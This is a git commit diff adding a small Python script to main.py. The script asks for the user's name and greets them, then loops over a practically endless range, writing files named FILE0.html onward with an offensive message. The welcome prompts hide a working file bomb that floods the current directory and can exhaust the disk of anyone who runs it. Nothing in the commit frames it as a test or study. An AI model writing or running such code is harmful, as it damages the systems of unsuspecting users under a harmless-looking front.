81e968ea78302661e633a0843a04b49340bbe3f2
bagas-patok <88608788+bagaspatok0@users.noreply.github.com>
2021-08-09 08:41:06 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,10 @@
-
+import os, time
+os.system("clear")
+a = input("nama: ")
+time.sleep(1)
+print("Welcome: ",a)
+b = input("Tap to enter untuk melanjutkan: ")
+for i in range(999999999999999999999999999999999999999999):
+  data = open("FILE{}.html".format (i), "w")
+  data.write("<center><h1>FUCKED YOU<h1><center>")
+  data.close()
